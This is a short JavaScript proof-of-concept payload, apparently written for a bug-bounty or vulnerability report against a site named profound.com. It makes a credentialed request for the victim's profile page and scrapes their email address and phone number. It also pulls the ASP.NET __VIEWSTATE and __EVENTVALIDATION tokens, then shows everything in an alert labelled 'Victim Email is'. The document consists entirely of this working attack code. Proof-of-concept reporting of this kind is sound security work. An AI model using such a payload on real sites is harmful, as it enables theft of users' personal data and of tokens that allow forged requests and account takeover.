fetch("https://www.profound.com/Pages/Subscriptions/ProfileManagement.aspx?view=Profile", {
  credentials: "include"
})
.then(response => response.text())
.then(html => {
    let parser = new DOMParser();
    let doc = parser.parseFromString(html, "text/html");
    let email = doc.querySelector("#BodyArea_MainContentArea_radEmailAddress_text")?.value;
    let phone = doc.querySelector("#BodyArea_MainContentArea_radPhone_text")?.value;

    let viewstate = html.match(/id="__VIEWSTATE" value="([^"]+)"/)?.[1];
    let previousPage = html.match(/id="__PREVIOUSPAGE" value="([^"]+)"/)?.[1];
    let eventValidation = html.match(/id="__EVENTVALIDATION" value="([^"]+)"/)?.[1];

    alert("Victim Email is: " + email + "\nVictim Phone is: " + phone + "__VIEWSTATE:\n" + viewstate + "\n\n__PREVIOUSPAGE:\n" + previousPage + "\n\n__EVENTVALIDATION:\n" + eventValidation);
});
